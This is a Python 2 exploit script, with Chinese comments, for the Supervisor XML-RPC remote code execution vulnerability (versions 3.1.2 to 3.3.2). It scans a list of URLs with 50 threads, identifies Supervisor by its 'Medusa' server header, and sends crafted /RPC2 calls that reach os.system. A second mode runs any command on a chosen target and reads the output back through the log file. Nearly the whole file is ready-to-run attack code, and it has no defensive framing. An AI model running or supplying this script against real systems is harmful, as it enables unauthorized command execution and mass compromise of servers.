#!/usr/bin/env python
#coding:utf-8
'''
supervisor远程代码执行漏洞
影响版本：Supervisor 3.1.2 <= Version <= 3.3.2
已修复版本：Supervisor 3.3.3、Supervisor 3.2.4、Superivsor 3.1.4、Supervisor 3.0.1
'''
import requests.exceptions
import requests
import re
import threading
import Queue
import sys

url_q = Queue.Queue()  #设置队列
Thread_num = 50 #设置线程数
threads = []  #定义线程列表
super_vul_list = []#漏洞url列表

headers={
      'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
      'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Connection':'keep-alive'
      }

#定义线程类
class SuperThread(threading.Thread):
        def __init__(self,func):
                threading.Thread.__init__(self)
                self.func = func

        def run(self):
                self.func()

#定义url获取函数
def get_url(filename):
        with open(filename) as f:
                for f in f.readlines():
                        f = f.strip()
                        url_q.put(f)

#定义漏洞检测函数
def chek_poc(url,cmd="whoami"):
        c_pattern = "<int>(.*?)</int>"
        post_url = url+"/RPC2"
        print post_url
        poc_data = '''<?xml version="1.0"?><methodCall><methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName><params><param><string>%s</string></param></params></methodCall>'''%cmd
        c_pattern = "<int>(.*?)</int>"
        try:
                poc_content = requests.post(post_url,data=poc_data,headers=headers,timeout=10)
                print poc_content
                if int(re.search(c_pattern,poc_content.content).group(1)) == 0:
                        print "is valueable!!!!!!!!"
                        super_vul_list.append(url)
        except:
                print "is not valueable"
#定义superbisor检测函数
def chek_super():
        global super_re
        while not url_q.empty():
                try:
                        url = url_q.get()
                        super_res = requests.get(url,headers=headers,timeout=1)
                        pattern = super_res.headers['Server']
                        if "Medusa" in pattern:
                                print "yes.....checking"
                                chek_poc(url)
                        else:
                                print "%s===>not Supervisor"%url
                        self.queue.task_done()
                except:
                        print "%sRequests error"%url
#定义命令执行函数
def commond(url,cmd="whoami"):
        url = url+"/RPC2"
        print "[+] Get logfile Location......"
        log_xml = '''<?xml version='1.0'?><methodCall><methodName>supervisor.supervisord.options.logfile.strip</methodName><params></params></methodCall>'''
        log_content = requests.post(url,headers=headers,data=log_xml).content
        log_location =re.search(re.compile(r"<string>(.*?)</string>"),log_content).group(1)
        print "[----]%s"%log_location
        print "[+] excute commond Write into logfile...."
        commond_xml = '''<?xml version='1.0'?><methodCall><methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName><params><param><value><string>%s | tee -a %s</string></value></param></params></methodCall>'''%(cmd,log_location)
        commond_content = requests.post(url,headers=headers,data=commond_xml).content
        #print "[+] read logfile.............."
        if "<int>0</int>" in commond_content:
                print "[----] excute commond success...."
                print "[+] staring readLogfile waitting...."
                logfile_xml = '''<?xml version='1.0'?><methodCall><methodName>supervisor.readLog</methodName><params><param><value><int>0</int></value></param><param><value><int>0</int></value></param></params></methodCall>'''
                logfile_content = requests.post(url,headers=headers,data=logfile_xml).content
                pattern = re.compile(r"\d{4}-\d{1,2}-\d{1,2}(.*?)</",re.M|re.S)
                print re.search(pattern,logfile_content).group(1)
        else:
                print "[----] excute commond failed...."

#主函数
def main(filename,cmd=None):
        global url_q,threads,Thread_num
        get_url(filename)
        for i in xrange(Thread_num):
                s = SuperThread(chek_super)
                s.start()
                threads.append(s)
        for t in threads:
                t.join()
        print super_vul_list
if __name__ == '__main__':
        try:
                if sys.argv[1] == "-f":
                        main(sys.argv[2])
                if sys.argv[1] == "-u" and sys.argv[3] == "-c":
                        commond(sys.argv[2],sys.argv[4])
        except:
                print "usage: python supervisor.py -f ip.txt"
                print "usage: python supervisor.py -u [url]http://www.baidu.com[/url] -c whoami"